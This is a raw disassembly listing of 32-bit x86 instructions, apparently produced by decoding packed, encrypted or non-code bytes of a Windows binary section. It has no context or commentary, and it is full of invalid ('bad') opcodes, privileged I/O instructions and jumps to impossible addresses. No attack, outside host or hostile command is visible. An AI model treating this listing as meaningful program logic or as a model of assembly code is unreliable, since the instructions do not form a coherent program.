  40dc92:	xchg   DWORD PTR [ecx+ecx*1],edi
  40dc95:	(bad)  
  40dc96:	and    dl,ch
  40dc98:	lea    ecx,[ebx-0x16920776]
  40dc9e:	sbb    eax,0xfae10f47
  40dca3:	and    cl,dl
  40dca5:	and    DWORD PTR [edi],ebx
  40dca7:	xor    cl,0xd9
  40dcaa:	xlat   BYTE PTR ds:[ebx]
  40dcab:	ret    0xe8b
  40dcae:	dec    ebp
  40dcaf:	out    dx,eax
  40dcb0:	sub    ebp,DWORD PTR ds:0x69fa61b4
  40dcb6:	mov    ebp,0x4d784865
  40dcbb:	or     al,bl
  40dcbd:	cdq    
  40dcbe:	add    al,0xa6
  40dcc0:	(bad)  
  40dcc1:	dec    ebp
  40dcc2:	sub    al,0x48
  40dcc4:	or     eax,0x68c274a3
  40dcc9:	push   es
  40dcca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dccb:	mov    DWORD PTR [edx-0x1ebda86a],0xfa05f54f
  40dcd5:	dec    edi
  40dcd6:	mov    ebx,0x8d129aba
  40dcdb:	dec    ebx
  40dcdc:	ror    al,1
  40dcde:	sti    
  40dcdf:	stos   DWORD PTR es:[edi],eax
  40dce0:	pushf  
  40dce1:	retf   
  40dce2:	mov    ecx,0x9fce8334
  40dce7:	in     al,0x56
  40dce9:	adc    ecx,edx
  40dceb:	mov    ah,0xad
  40dced:	mov    al,ds:0x16f92658
  40dcf2:	add    BYTE PTR [ebp-0x694fc1a7],al
  40dcf8:	fstp   DWORD PTR [eax-0x43]
  40dcfb:	sub    esp,esp
  40dcfd:	scas   eax,DWORD PTR es:[edi]
  40dcfe:	jecxz  0x40dce6
  40dd00:	ss inc edi
  40dd02:	(bad)  
  40dd03:	push   ecx
  40dd04:	lea    esi,[esi+0x434e0e8c]
  40dd0a:	cmp    al,0xbe
  40dd0c:	mov    BYTE PTR [esi+ebx*2],bh
  40dd0f:	mul    dl
  40dd11:	mov    edx,0xb757ac35
  40dd16:	pop    eax
  40dd17:	cmp    BYTE PTR [edi-0x8],ch
  40dd1a:	pop    es
  40dd1b:	(bad)  
  40dd1d:	adc    eax,0xe1039266
  40dd22:	xchg   DWORD PTR [edi+0x1053b73],edx
  40dd28:	pop    ebp
  40dd29:	aam    0x4a
  40dd2b:	imul   BYTE PTR [edx-0x50]
  40dd2e:	adc    ecx,eax
  40dd30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd31:	into   
  40dd32:	mov    DWORD PTR [edx+0x230c7851],ecx
  40dd38:	sub    ah,BYTE PTR [ecx+eax*2+0x22251083]
  40dd3f:	cmc    
  40dd40:	enter  0x43c8,0x15
  40dd44:	mov    DWORD PTR [ebp+0x71d17dfc],eax
  40dd4a:	push   0x44
  40dd4c:	fisubr DWORD PTR [edi+0x7d]
  40dd4f:	ja     0x40dda8
  40dd51:	repnz retf 
  40dd53:	sbb    ah,cl
  40dd55:	push   edx
  40dd56:	nop
  40dd57:	repnz xor al,0x27
  40dd5a:	add    BYTE PTR [edx+0x7b],dl
  40dd5d:	cmp    eax,0x8f35bba6
  40dd62:	js     0x40dd67
  40dd64:	pop    ds
  40dd65:	in     al,0x38
  40dd67:	mov    esp,0x6410d509
  40dd6c:	loop   0x40dd4b
  40dd6e:	retf   0x95c3
  40dd71:	xor    DWORD PTR [esi-0x64],0x860791db
  40dd78:	add    al,0xa8
  40dd7a:	mov    ebx,0x73e5786e
  40dd7f:	stos   DWORD PTR es:[edi],eax
  40dd80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd81:	lods   eax,DWORD PTR ds:[esi]
  40dd82:	nop
  40dd83:	arpl   WORD PTR [esi],dx
  40dd85:	mov    BYTE PTR [eax+0x7dcdb68b],al
  40dd8b:	fbstp  TBYTE PTR [esi]
  40dd8d:	sub    al,0xff
  40dd8f:	sar    BYTE PTR [esi-0x2a94119e],0x7a
  40dd96:	ficomp DWORD PTR [esi]
  40dd98:	xchg   DWORD PTR [eax-0x116f423e],esp
  40dd9e:	pop    esp
  40dd9f:	push   eax
  40dda0:	cmc    
  40dda1:	fcomp  QWORD PTR [ebx-0xe3735d2]
  40dda7:	pop    es
  40dda8:	mov    esp,0x33d43c3a
  40ddad:	jno    0x40de0f
  40ddaf:	int3   
  40ddb0:	adc    DWORD PTR [ecx-0x20edf400],ebp
  40ddb6:	mov    al,0x5a
  40ddb8:	je     0x40dd61
  40ddba:	push   0x9eeb1ffc
  40ddbf:	dec    edi
  40ddc0:	cmp    al,BYTE PTR [edi+0x2a]
  40ddc3:	mov    esi,0x2318fb37
  40ddc8:	cmp    dh,BYTE PTR [ecx-0x48]
  40ddcb:	loopne 0x40dd63
  40ddcd:	mov    ds:0x7a110c0e,al
  40ddd2:	into   
  40ddd3:	adc    ebx,edx
  40ddd5:	pop    eax
  40ddd6:	xchg   DWORD PTR [eax-0x728d310b],ecx
  40dddc:	out    0xfc,al
  40ddde:	dec    ecx
  40dddf:	test   ch,cl
  40dde1:	pop    eax
  40dde2:	(bad)  
  40dde3:	adc    DWORD PTR [eax+0x5c6d4161],edi
  40dde9:	daa    
  40ddea:	xchg   edi,eax
  40ddeb:	sbb    dh,bh
  40dded:	nop
  40ddee:	push   0x60
  40ddf0:	imul   edx,DWORD PTR [edx-0x1831d736],0x14
  40ddf7:	or     ch,bl
  40ddf9:	mov    bh,bh
  40ddfb:	rol    BYTE PTR fs:[ebx+0x3a],0x33
  40de00:	cmp    al,0x8b
  40de02:	and    ch,bh
  40de04:	push   edi
  40de05:	pushf  
  40de06:	mov    ds:0x5c9ec208,al
  40de0b:	xchg   ecx,eax
  40de0c:	jp     0x40de24
  40de0e:	ins    BYTE PTR es:[edi],dx
  40de0f:	int    0x68
  40de11:	mov    al,ds:0x59fc6efb
  40de16:	icebp  
  40de17:	popf   
  40de18:	inc    esi
  40de19:	pop    esp
  40de1a:	aas    
  40de1b:	push   edx
  40de1c:	xor    esi,DWORD PTR [ecx+0x76ba37e0]
  40de22:	(bad)  
  40de23:	pop    eax
  40de24:	sbb    eax,0x6c556722
  40de29:	xor    eax,0x89d678af
  40de2e:	fcomp  QWORD PTR [ebp+ebx*4-0x38]
  40de32:	inc    edx
  40de33:	xlat   BYTE PTR ds:[ebx]
  40de34:	inc    DWORD PTR [eax+0x74]
  40de37:	jo     0x40de08
  40de39:	call   0x41d01f4e
  40de3e:	bound  ebp,QWORD PTR [eax]
  40de40:	pop    ecx
  40de41:	mov    bl,0x2e
  40de43:	cld    
  40de44:	ret    0x16e8
  40de47:	call   0x37b3:0x97f4bd5b
  40de4e:	sahf   
  40de4f:	adc    al,0x95
  40de51:	shl    DWORD PTR ds:0x3b5ac216,cl
  40de57:	cmp    al,0xcf
  40de59:	repz mov esi,0xca9ed08f
  40de5f:	or     eax,DWORD PTR [edx+0x19]
  40de62:	mov    bh,0xa0
  40de64:	add    esp,edi
  40de66:	(bad)  
  40de68:	dec    ebx
  40de69:	shl    ecx,1
  40de6b:	sbb    dl,BYTE PTR [ebp+0x14582a1]
  40de71:	cmp    eax,0x98977376
  40de76:	adc    eax,0x137c475e
  40de7b:	cmp    al,0xbb
  40de7d:	mov    al,ds:0x17504981
  40de82:	mov    edx,0xd1605f73
  40de87:	dec    esi
  40de88:	std    
  40de89:	stos   BYTE PTR es:[edi],al
  40de8a:	hlt    
  40de8b:	jne    0x40de6b
  40de8d:	idiv   ebx
  40de8f:	cmp    eax,0xf55e33da
  40de94:	xchg   ecx,eax
  40de95:	pop    ds
  40de96:	repz lock fsub DWORD PTR [edx]
  40de9a:	ss mul ch
  40de9d:	fst    st(4)
  40de9f:	mov    al,0x1e
  40dea1:	cli    
  40dea2:	cmp    esi,0x5b
  40dea5:	repz dec esp
  40dea7:	sub    BYTE PTR [edx+0x25],cl
  40deaa:	adc    DWORD PTR [edi],ebx
  40deac:	dec    DWORD PTR [esi]
  40deae:	adc    al,0xae
  40deb0:	clc    
  40deb1:	adc    BYTE PTR [edx-0x28],bh
  40deb4:	xchg   BYTE PTR [esi-0x520467f5],ah
  40deba:	add    bh,ch
  40debc:	adc    al,0xb0
  40debe:	pusha  
  40debf:	inc    esp
  40dec0:	lods   al,BYTE PTR ds:[esi]
  40dec1:	or     bh,al
  40dec3:	shl    BYTE PTR [esi-0x5f],cl
  40dec6:	jge    0x40df13
  40dec8:	mov    al,ds:0xb8ebe51e
  40decd:	adc    BYTE PTR [ebp-0x70],0x8a
  40ded1:	loopne 0x40de55
  40ded3:	cmp    ebx,DWORD PTR [edx+0x2d45f587]
  40ded9:	ins    BYTE PTR es:[edi],dx
  40deda:	push   ss
  40dedb:	jp     0x40de80
  40dedd:	rcr    DWORD PTR ds:0xd2c23a97,cl
  40dee3:	loop   0x40dedb
  40dee5:	out    dx,eax
  40dee6:	(bad)  
  40dee7:	push   ds
  40dee8:	adc    esi,ecx
  40deea:	or     dh,ah
  40deec:	and    ah,bh
  40deee:	sar    ebx,1
  40def0:	dec    eax
  40def1:	lods   al,BYTE PTR ds:[esi]
  40def2:	mov    edx,edi
  40def4:	sub    ebp,DWORD PTR [ebx]
  40def6:	add    bl,BYTE PTR [esp+edx*4+0x9]
  40defa:	inc    ecx
  40defb:	loop   0x40df72
  40defd:	adc    DWORD PTR [ebx],ecx
  40deff:	fs cmc 
  40df01:	mov    edx,DWORD PTR [ebx+0x9]
  40df04:	mov    ch,0x86
  40df06:	dec    eax
  40df07:	jno    0x40dea3
  40df09:	loopne 0x40de9d
  40df0b:	ret    
  40df0c:	hlt    
  40df0d:	sub    al,0xcf
  40df0f:	jmp    0x4fc3eb7e
  40df14:	mov    ds:0xd9ddefc2,eax
  40df19:	jne    0x40df15
  40df1b:	aad    0x1d
  40df1d:	pop    ecx
  40df1e:	mov    ds:0x9a3d4668,eax
  40df23:	sar    DWORD PTR [eax],cl
  40df25:	pop    ds
  40df26:	mov    dh,0x52
  40df28:	or     dh,BYTE PTR [eax+0x2598be23]
  40df2e:	imul   edx,esi,0x2f7df83c
  40df34:	data16 into 
  40df36:	gs sub esp,ecx
  40df39:	pop    es
  40df3a:	ins    DWORD PTR es:[edi],dx
  40df3b:	inc    ebx
  40df3c:	dec    edx
  40df3d:	push   esi
  40df3e:	repz loopne 0x40dfbc
  40df41:	xchg   esp,eax
  40df42:	and    eax,0xc9147f1
  40df47:	sbb    bh,bh
  40df49:	popf   
  40df4a:	test   BYTE PTR ds:[ebp+0x46],0xac
  40df4f:	cmc    
  40df50:	sub    BYTE PTR [ebp+0x5ddbce88],ah
  40df56:	xchg   BYTE PTR [esi+eax*2-0x7a],ah
  40df5a:	xchg   bl,dl
  40df5c:	bound  eax,QWORD PTR [esi+0x47]
  40df5f:	aaa    
  40df60:	hlt    
  40df61:	std    
  40df62:	sub    dh,ch
  40df64:	pushf  
  40df65:	outs   dx,BYTE PTR ds:[esi]
  40df66:	popa   
  40df67:	gs ss stos DWORD PTR es:[edi],eax
  40df6a:	xor    eax,0xd3450650
  40df6f:	mov    eax,0xf9684b7f
  40df74:	fstp   TBYTE PTR [edx+0x58185a00]
  40df7a:	ds pop ebx
  40df7c:	add    DWORD PTR [ebx],esi
  40df7e:	dec    ebx
  40df7f:	dec    edx
  40df80:	ss push esp
  40df82:	cmc    
  40df83:	mov    ds:0x9b69e447,al
  40df88:	call   0x1a6e9bc0
  40df8d:	mov    esi,0x46126099
  40df92:	jns    0x40dfa1
  40df94:	popa   
  40df95:	out    dx,eax
  40df96:	and    al,0x86
  40df98:	loop   0x40df5b
  40df9a:	int3   
  40df9b:	dec    esi
  40df9c:	push   cs
  40df9d:	pmullw mm6,mm4
  40dfa0:	adc    BYTE PTR ds:0xfbee5a3d,dh
  40dfa6:	call   0x4da033fa
  40dfab:	cmp    BYTE PTR [ecx+0x6826fa9],bh
  40dfb1:	or     ebx,esp
  40dfb3:	(bad)  
  40dfb4:	or     BYTE PTR [ebx-0x46b36139],bl
  40dfba:	push   edi
  40dfbb:	repnz jecxz 0x40dfb0
  40dfbe:	xchg   esi,eax
  40dfbf:	mov    ecx,0xbb4b6acb
  40dfc4:	lods   eax,DWORD PTR ds:[esi]
  40dfc5:	sar    dh,0xeb
  40dfc8:	jnp    0x40df4f
  40dfca:	rcr    BYTE PTR [edx+0x1257657f],1
  40dfd0:	adc    edi,DWORD PTR [ebp-0x392d44a0]
  40dfd6:	je     0x40df81
  40dfd8:	das    
  40dfd9:	cwde   
  40dfda:	hlt    
  40dfdb:	push   0x101d5f17
  40dfe0:	and    eax,0xa7b80194
  40dfe5:	mov    dh,0xcf
  40dfe7:	push   0x6d
  40dfe9:	add    esi,DWORD PTR [esi+eax*1+0x66ac9890]
  40dff0:	out    0x13,eax
  40dff2:	and    DWORD PTR [eax],ebp
  40dff4:	sub    ch,BYTE PTR cs:[edi+0x7c]
  40dff8:	or     BYTE PTR [esi-0x63],bl
  40dffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dffc:	loop   0x40dfb0
  40dffe:	ror    DWORD PTR [edx+ecx*4-0x80],cl
  40e002:	pushf  
  40e003:	mov    eax,ds:0xa7de7682
  40e008:	ja     0x40dffb
  40e00a:	mov    al,ds:0xb5857d40
  40e00f:	cmp    ebx,DWORD PTR [edi+0x5c8d2247]
  40e015:	dec    eax
  40e016:	mov    ch,al
  40e018:	xchg   ecx,eax
  40e019:	xchg   ebp,eax
  40e01a:	in     al,dx
  40e01b:	sbb    eax,0x1f987f29
  40e020:	fisubr DWORD PTR [edx+0x399234c7]
  40e026:	gs inc eax
  40e028:	fwait
  40e029:	retf   0xc792
  40e02c:	pop    es
  40e02d:	lahf   
  40e02e:	add    dl,dh
  40e030:	psllq  mm7,QWORD PTR [ebx+ebx*8]
  40e034:	(bad)  
  40e035:	add    dh,dl
  40e037:	ins    DWORD PTR es:[edi],dx
  40e038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e039:	stos   DWORD PTR es:[edi],eax
  40e03a:	cmp    al,al
  40e03c:	push   edi
  40e03d:	aad    0xf7
  40e03f:	inc    esp
  40e040:	jns    0x40e0b8
  40e042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e043:	ds cmp al,0xd8
  40e046:	pop    ds
  40e047:	fisubr DWORD PTR [ecx+0x2dca0619]
  40e04d:	xor    dh,BYTE PTR [ecx+0x55a0fbe]
  40e053:	fwait
  40e054:	xchg   edx,eax
  40e055:	in     al,dx
  40e056:	push   es
  40e057:	sahf   
  40e058:	cld    
  40e059:	nop
  40e05a:	jbe    0x40e04c
  40e05c:	add    al,0x4a
  40e05e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e05f:	push   edi
  40e060:	sahf   
  40e061:	jecxz  0x40dfe9
  40e063:	mov    ebp,DWORD PTR [ebx]
  40e065:	mov    ch,0x3b
  40e067:	call   0x71f8:0x8ee8377e
  40e06e:	jp     0x40e011
  40e070:	sbb    DWORD PTR [bx+si+0x34],eax
  40e074:	je     0x40e0d4
  40e076:	arpl   WORD PTR [eax],ax
  40e078:	jle    0x40e0a7
  40e07a:	iret   
  40e07b:	sbb    DWORD PTR ds:0x39faee2f,0xe
  40e082:	in     eax,0xa1
  40e084:	inc    ecx
  40e085:	mov    WORD PTR [esi+ecx*2+0x6b],gs
  40e089:	xchg   ebp,eax
  40e08a:	lods   al,BYTE PTR ds:[esi]
  40e08b:	(bad)  
  40e08c:	arpl   WORD PTR [esi+0x70],bp
  40e08f:	arpl   WORD PTR [ecx],dx
  40e091:	and    edx,DWORD PTR [ebp+0x73]
  40e094:	stc    
  40e095:	push   eax
  40e096:	lods   al,BYTE PTR ds:[esi]
  40e097:	sahf   
  40e098:	int3   
  40e099:	push   ebp
  40e09a:	mov    ebp,0x7b45afb9
  40e09f:	loop   0x40e049
  40e0a1:	sar    bl,cl
  40e0a3:	cmp    ah,BYTE PTR [esi]
  40e0a5:	bound  edx,QWORD PTR [ecx+0x3c]
  40e0a8:	enter  0x9298,0xe0
  40e0ac:	xor    BYTE PTR [eax+0x60],dh
  40e0af:	ss addr16 and al,0xa1
  40e0b3:	call   0xae6d:0xd3bcecd2
  40e0ba:	icebp  
  40e0bb:	fsubr  DWORD PTR [ebx+0x65]
  40e0be:	into   
  40e0bf:	sbb    DWORD PTR [eax],ebx
  40e0c1:	inc    edx
  40e0c2:	out    0x8f,eax
  40e0c4:	sub    ebx,DWORD PTR [edi+0x7f]
  40e0c7:	inc    edi
  40e0c8:	or     eax,0xfeadf487
  40e0cd:	cwde   
  40e0ce:	je     0x40e076
  40e0d0:	shl    BYTE PTR [edi],cl
  40e0d2:	add    eax,0x845d4bcb
  40e0d7:	shl    DWORD PTR es:[eax],1
  40e0da:	imul   ebp,ebp,0xffffffbd
  40e0dd:	add    edi,DWORD PTR [ebx+0x49]
  40e0e0:	cmp    BYTE PTR [edx+eax*1],al
  40e0e3:	scas   al,BYTE PTR es:[edi]
  40e0e4:	and    eax,0x642a0c89
  40e0e9:	frstor [eax-0x4d14a6cf]
  40e0ef:	js     0x40e0ef
  40e0f1:	cld    
  40e0f2:	(bad)  
  40e0f3:	(bad)  
  40e0f4:	dec    BYTE PTR [ecx+0x52]
  40e0f7:	test   BYTE PTR [eax+0x120b0780],bl
  40e0fd:	pop    ds
  40e0fe:	retf   0x511d
  40e101:	dec    ebp
  40e102:	push   edx
  40e103:	jecxz  0x40e090
  40e105:	xor    al,BYTE PTR [edx+0x71]
  40e108:	cli    
  40e109:	or     eax,0xc79d056
  40e10e:	cmp    cl,BYTE PTR [edx]
  40e110:	cli    
  40e111:	dec    eax
  40e112:	push   edi
  40e113:	(bad)  
  40e115:	adc    al,0x2f
  40e117:	scas   al,BYTE PTR es:[edi]
  40e118:	sub    dl,BYTE PTR [ecx]
  40e11a:	cmp    al,0x8
  40e11c:	jge    0x40e114
  40e11e:	or     eax,0x8085afb8
  40e123:	inc    ebp
  40e124:	push   cs
  40e125:	leave  
  40e126:	das    
  40e127:	js     0x40e15d
  40e129:	xchg   esp,eax
  40e12a:	pusha  
  40e12b:	mov    ah,0x45
  40e12d:	ja     0x40e172
  40e12f:	leave  
  40e130:	test   al,0x7e
  40e132:	(bad)  
  40e133:	mov    edi,edx
  40e135:	cmp    eax,0x5ac47075
  40e13a:	lock shl bh,1
  40e13d:	sbb    esp,DWORD PTR [edi+ecx*4]
  40e140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e141:	fiadd  DWORD PTR [esi]
  40e143:	add    bh,BYTE PTR [esi+edx*8]
  40e146:	(bad)  [edi]
  40e148:	jb     0x40e136
  40e14a:	dec    ebp
  40e14b:	mov    bl,0x9e
  40e14d:	fisttp DWORD PTR [edi+ecx*4-0x1f0e4568]
  40e154:	sbb    BYTE PTR [edi-0x6bfb8564],bl
  40e15a:	and    DWORD PTR [ebx+0x5714debc],eax
  40e160:	dec    esi
  40e161:	lods   al,BYTE PTR ds:[esi]
  40e162:	sahf   
  40e163:	test   eax,0x7a21621e
  40e168:	push   esi
  40e169:	ja     0x40e14e
  40e16b:	lock cmp al,0x4d
  40e16e:	xor    al,0xee
  40e170:	jne    0x40e103
  40e172:	sub    al,0x57
  40e174:	lock cdq 
  40e176:	jo     0x40e1da
  40e178:	xor    esp,ecx
  40e17a:	mov    ds:0xa9387351,eax
  40e17f:	jnp    0x40e1af
  40e181:	mov    eax,0x8c9b3b1e
  40e186:	fcom   QWORD PTR [eax-0x51137de8]
  40e18c:	dec    esp
  40e18d:	mov    edx,0xcfefe866
  40e192:	out    dx,al
  40e193:	jle    0x40e212
  40e195:	sbb    BYTE PTR [esi+ecx*4-0x53],dh
  40e199:	stos   BYTE PTR es:[edi],al
  40e19a:	out    dx,al
  40e19b:	jae    0x40e1ba
  40e19d:	mov    cl,0xaf
  40e19f:	push   esi
  40e1a0:	mov    edx,0x5db5bf6b
  40e1a5:	mov    bh,0x2f
  40e1a7:	les    esi,FWORD PTR [ecx-0x7d]
  40e1aa:	push   ecx
  40e1ab:	xchg   esi,eax
  40e1ac:	xor    esi,edx
  40e1ae:	fdiv   DWORD PTR [ecx-0x59]
  40e1b1:	push   0x211c0ba2
  40e1b6:	ss mov ecx,0x698769a2
  40e1bc:	leave  
  40e1bd:	mov    cs,WORD PTR [ecx]
  40e1bf:	(bad)  
  40e1c0:	ins    DWORD PTR es:[edi],dx
  40e1c1:	loopne 0x40e1cd
  40e1c3:	pop    ss
  40e1c4:	jne    0x40e15e
  40e1c6:	arpl   WORD PTR [ebx+0x3fbc9263],bp
  40e1cc:	jle    0x40e1d5
  40e1ce:	scas   al,BYTE PTR es:[edi]
  40e1cf:	xchg   edi,eax
  40e1d0:	jge    0x40e1c0
  40e1d2:	loopne 0x40e23d
  40e1d4:	sti    
  40e1d5:	pop    eax
  40e1d6:	out    0xcb,eax
  40e1d8:	mov    ebp,0xfc09da27
  40e1dd:	(bad)  
  40e1de:	adc    al,0x14
  40e1e0:	jmp    0xfb9e45c4
  40e1e5:	stos   DWORD PTR es:[edi],eax
  40e1e6:	mov    esi,0x9faba8e9
  40e1eb:	jo     0x40e21d
  40e1ed:	push   0xa62c21d6
  40e1f2:	mov    al,ds:0xe608ee54
  40e1f7:	loope  0x40e1cd
  40e1f9:	fiadd  DWORD PTR [ebx+0x5a]
  40e1fc:	jg     0x40e21c
  40e1fe:	test   al,0x28
  40e200:	add    al,0x87
  40e202:	ret    
  40e203:	push   ss
  40e204:	cmp    ebx,DWORD PTR [edi]
  40e206:	cmc    
  40e207:	push   cs
  40e208:	or     BYTE PTR [ebx],0xb0
  40e20b:	ins    BYTE PTR es:[edi],dx
  40e20c:	test   al,0x83
  40e20e:	pop    esi
  40e20f:	jg     0x40e20d
  40e211:	sbb    eax,0xec6790a6
  40e216:	rol    BYTE PTR [ebx-0x782d773d],cl
  40e21c:	test   bl,ah
  40e21e:	sbb    ecx,DWORD PTR [edx-0x4451cac8]
  40e224:	sub    ebx,DWORD PTR [ebp+0x4f5dfbab]
  40e22a:	mov    dh,0x3d
  40e22c:	jns    0x40e21c
  40e22e:	popa   
  40e22f:	(bad)  
  40e230:	arpl   WORD PTR [ebp+edi*8-0x12],si
  40e234:	lea    esi,[edi+0x60]
  40e237:	and    BYTE PTR [esi-0x3590130c],dl
  40e23d:	mov    eax,ds:0x92bd8d05
  40e242:	mov    BYTE PTR [edx-0x54563640],dh
  40e248:	or     eax,0xafdd4bb0
  40e24d:	mov    ah,0xbd
  40e24f:	add    dh,BYTE PTR [edi-0x31]
  40e252:	jecxz  0x40e297
  40e254:	xor    dh,BYTE PTR [edi]
  40e256:	arpl   WORD PTR [ecx+0x74],di
  40e259:	push   cs
  40e25a:	gs jp  0x40e283
  40e25d:	cmp    eax,0xc5e4721e
  40e262:	lock xchg ecx,ebx
  40e265:	add    al,0x3a
  40e267:	scas   al,BYTE PTR es:[edi]
  40e268:	(bad)  
  40e269:	ja     0x40e28e
  40e26b:	mov    eax,edi
  40e26d:	push   ebp
  40e26e:	ret    
  40e26f:	push   cs
  40e270:	add    al,0xa0
  40e272:	sbb    eax,0x3d33123d
  40e277:	cmp    DWORD PTR [esp+eiz*8+0x5eecac75],esp
  40e27e:	loope  0x40e274
  40e280:	call   0x13cd5a28
  40e285:	je     0x40e283
  40e287:	jae    0x40e26e
  40e289:	outs   dx,BYTE PTR ds:[esi]
  40e28a:	push   ebx
  40e28b:	sbb    esi,DWORD PTR [ebx]
  40e28d:	test   cl,ch
  40e28f:	sti    
  40e290:	mov    edx,0x904a21ba
  40e295:	cli    
  40e296:	(bad)  
  40e297:	fbstp  TBYTE PTR [ecx+0x20dbae3]
  40e29d:	xchg   ecx,eax
  40e29e:	and    al,0x37
  40e2a0:	div    DWORD PTR [edx+eiz*8+0x2978dfbb]
  40e2a7:	pushf  
  40e2a8:	dec    edx
  40e2a9:	sti    
  40e2aa:	jecxz  0x40e261
  40e2ac:	dec    DWORD PTR [eax*4+0x3180436e]
  40e2b3:	fiadd  DWORD PTR [ebx+ebp*8-0x78049865]
  40e2ba:	stos   BYTE PTR es:[edi],al
  40e2bb:	sti    
  40e2bc:	add    dl,BYTE PTR ds:0x96b5af8f
  40e2c2:	fist   DWORD PTR [esi+0x1c858781]
  40e2c8:	pop    edx
  40e2c9:	arpl   WORD PTR [edi-0x7407b37b],dx
  40e2cf:	or     dh,BYTE PTR [edx+ebp*1]
  40e2d2:	jmp    0x3db671e7
  40e2d7:	inc    ecx
  40e2d8:	cmp    BYTE PTR [esi+0x41],ah
  40e2db:	add    ch,BYTE PTR [esi+0x13]
  40e2de:	pop    edi
  40e2df:	cmp    DWORD PTR [ecx+0x3d],ebp
  40e2e2:	test   eax,0x3b1ca098
  40e2e7:	push   edx
  40e2e8:	inc    esp
  40e2e9:	jmp    0x40e350
  40e2eb:	dec    ecx
  40e2ec:	aas    
  40e2ed:	js     0x40e324
  40e2ef:	cmp    DWORD PTR [ebp+eax*2-0x22],edx
  40e2f3:	imul   esp,edx,0xffffff9e
  40e2f6:	add    al,0xc9
  40e2f8:	mov    ebx,0x4112d196
  40e2fd:	pop    esi
  40e2fe:	push   eax
  40e2ff:	pop    esp
  40e300:	das    
  40e301:	push   edi
  40e302:	xchg   ebx,eax
  40e303:	jmp    0x2d5c:0x14b1cd3c
  40e30a:	test   dh,dh
  40e30c:	mov    eax,ds:0x924c88e3
  40e311:	jg     0x40e381
  40e313:	and    cl,dl
  40e315:	rcr    DWORD PTR [eax],cl
  40e317:	xor    edi,eax
  40e319:	pusha  
  40e31a:	xor    BYTE PTR [eax-0xf],ch
  40e31d:	sub    ah,al
  40e31f:	add    eax,0x42a52624
  40e324:	push   es
  40e325:	push   esi
  40e326:	ins    DWORD PTR es:[edi],dx
  40e327:	cli    
  40e328:	fs jecxz 0x40e36d
  40e32b:	fst    QWORD PTR [esi+0x72]
  40e32e:	rol    DWORD PTR [edi+ebx*1+0x3f],cl
  40e332:	rol    ebx,0xd5
  40e335:	dec    eax
  40e336:	mov    edi,0x7293c687
  40e33b:	fcomip st,st(6)
  40e33d:	into   
  40e33e:	ror    DWORD PTR ds:0x8989dfd3,1
  40e344:	and    DWORD PTR [ecx],edx
  40e346:	daa    
  40e347:	das    
  40e348:	popf   
  40e349:	cmp    eax,0x974d42be
  40e34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e34f:	mov    edi,0xe6d9187c
  40e354:	jmp    0xe42af359
  40e359:	cmp    eax,0x535a711c
  40e35e:	mov    DWORD PTR [ebp+edi*1+0x7e],eax
  40e362:	or     al,0x89
  40e364:	int3   
  40e365:	aam    0xc7
  40e367:	fsubr  st,st(3)
  40e369:	mov    ecx,0xa263009f
  40e36e:	inc    ebx
  40e36f:	or     ah,bl
  40e371:	repz idiv BYTE PTR [edi]
  40e374:	iret   
  40e375:	pusha  
  40e376:	dec    esi
  40e377:	pop    esp
  40e378:	retf   0xa659
  40e37b:	fild   WORD PTR [edx+0x53]
  40e37e:	test   eax,0x5a5ecebd
  40e383:	sbb    eax,0xd4e3d34a
  40e388:	outs   dx,BYTE PTR ds:[esi]
  40e389:	addr16 nop
  40e38b:	outs   dx,DWORD PTR ds:[esi]
  40e38c:	dec    bl
  40e38e:	sub    eax,0xc44a894e
  40e393:	aad    0xc9
  40e395:	jmp    0x40e3d3
  40e397:	stc    
  40e398:	aas    
  40e399:	and    eax,0xc9836685
  40e39e:	in     eax,0x26
  40e3a0:	test   DWORD PTR [ebx+0x600caa60],0xc38115dc
  40e3aa:	icebp  
  40e3ab:	nop
  40e3ac:	xlat   BYTE PTR ds:[ebx]
  40e3ad:	cmp    ebx,DWORD PTR [ebp-0x4]
  40e3b0:	jecxz  0x40e36e
  40e3b2:	cli    
  40e3b3:	les    edi,FWORD PTR [edx+0x2b]
  40e3b6:	sbb    ebx,DWORD PTR [edi-0x3fcc874c]
  40e3bc:	(bad)  
  40e3bd:	shr    DWORD PTR [edx+eiz*4-0x1d],1
  40e3c1:	data16 cli 
  40e3c3:	dec    esi
  40e3c5:	push   0x5d
  40e3c7:	mov    ecx,0xecd67fdd
  40e3cc:	aaa    
  40e3cd:	and    ebx,DWORD PTR [esi+edi*4+0x7e]
  40e3d1:	enter  0x742a,0x81
  40e3d5:	xlat   BYTE PTR ds:[ebx]
  40e3d6:	push   ecx
  40e3d7:	push   ecx
  40e3d8:	xor    eax,0xf888e088
  40e3dd:	stc    
  40e3de:	lock mov dl,0x76
  40e3e1:	mov    cl,0x18
  40e3e3:	in     eax,dx
  40e3e4:	jge    0x40e3bf
  40e3e6:	mov    esp,0xf3b714aa
  40e3eb:	test   bh,bl
  40e3ed:	mov    esi,DWORD PTR [eax]
  40e3ef:	ret    
  40e3f0:	xlat   BYTE PTR ds:[ebx]
  40e3f1:	nop
  40e3f2:	mov    ch,0xcc
  40e3f4:	retf   
  40e3f5:	adc    ebx,ecx
  40e3f7:	rcr    BYTE PTR [esi+0x6bb05c13],cl
  40e3fd:	hlt    
  40e3fe:	ja     0x40e3e4
  40e400:	mov    bh,0x15
  40e402:	jg     0x40e416
  40e404:	mov    ebp,0xe98b0189
  40e409:	inc    edi
  40e40a:	inc    esi
  40e40b:	push   esp
  40e40c:	pop    ss
  40e40d:	inc    esi
  40e40e:	cmp    ecx,DWORD PTR [edx-0x4a]
  40e411:	fwait
  40e412:	jecxz  0x40e486
  40e414:	popf   
  40e415:	jae    0x40e3a5
  40e417:	pop    eax
  40e418:	lods   eax,DWORD PTR ds:[esi]
  40e419:	sbb    esp,DWORD PTR [eax-0x2f8de672]
  40e41f:	push   edx
  40e420:	sbb    eax,0x81466d0b
  40e425:	xor    BYTE PTR [ecx+0x10],bl
  40e428:	addr16 pop es
  40e42a:	test   BYTE PTR ds:0xf392f922,dh
